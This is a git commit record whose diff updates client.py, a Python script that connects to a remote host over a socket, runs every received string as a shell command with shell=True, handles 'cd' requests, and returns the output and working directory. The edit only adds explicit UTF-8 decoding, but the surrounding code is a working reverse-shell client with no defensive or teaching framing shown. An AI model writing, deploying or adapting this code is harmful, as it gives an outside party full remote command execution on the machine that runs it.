3561d1bf5823232ed3139e0a8f07b769aa40457d
prog-ammar <ammarofc2005@gmail.com>
2024-12-04 23:00:26 +0500

    Update client.py
    updated client.py

--- client.py
+++ client.py
@@ -9,10 +9,10 @@ s.connect((host,port))
 
 while True:
     data=s.recv(1024)
-    if data[:2].decode()=="cd":
-        os.chdir(data[3:].decode())
+    if data[:2].decode("utf-8")=="cd":
+        os.chdir(data[3:].decode("utf-8"))
     if len(data) > 0:
-        cmd=subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output=cmd.stdout.read()+cmd.stderr.read()
         output=str(output,"utf-8")
         string3=str.encode(output+str(os.getcwd()+'>'))
